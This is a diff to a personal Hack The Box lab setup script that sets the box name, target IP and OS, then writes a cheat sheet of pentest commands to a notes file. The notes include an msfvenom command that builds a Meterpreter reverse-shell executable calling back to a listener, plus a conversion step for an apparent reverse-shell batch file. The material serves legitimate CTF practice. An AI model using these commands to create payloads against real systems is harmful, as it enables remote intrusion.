@@ -3,12 +3,12 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Mist
+BOXNAME=Vintage
 LAST=
-OS=lin
+OS=win
 USER=bob
 
-export IP=10.10.11.17			#$LAST
+export IP=10.129.37.174			#$LAST
 export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
 export SELF=$(hostname -I | awk '{print $5}')
 export HTB_TOKEN=$(cat /opt/Scripts/.HTB_TOKEN)
@@ -119,7 +119,6 @@ echo "# usefull windows tricks" >> $HOME/notes
 echo 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe' >> $HOME/notes
 echo 'Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName' >> $HOME/notes
 echo 'Expand-Archive xyz.zip' >> $HOME/notes
-echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
 echo 'Start-Job -FilePath C:\Scripts\Sample.ps1' >> $HOME/notes
 echo "Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob" >> $HOME/notes
 echo "Invoke-Command -scriptblock { script }  -asJob -computername localhost" >> $HOME/notes
@@ -127,6 +126,12 @@ echo "Start-Job -scriptblock { script }" >> $HOME/notes
 echo "Start-Process powershell {script}" >> $HOME/notes
 echo "Get-Process <name>" >> $HOME/notes
 echo "Stop-Process <pid>" >> $HOME/notes
+
+# fix encoding
+echo "" >> $HOME/notes
+echo "# fix encoding problems " >> $HOME/notes
+echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
+echo "gc rev.bat|set-content rev2.bat -encoding ascii" >> $HOME/notes
 
 # Windows privesc checklist
 echo "" >> $HOME/notes
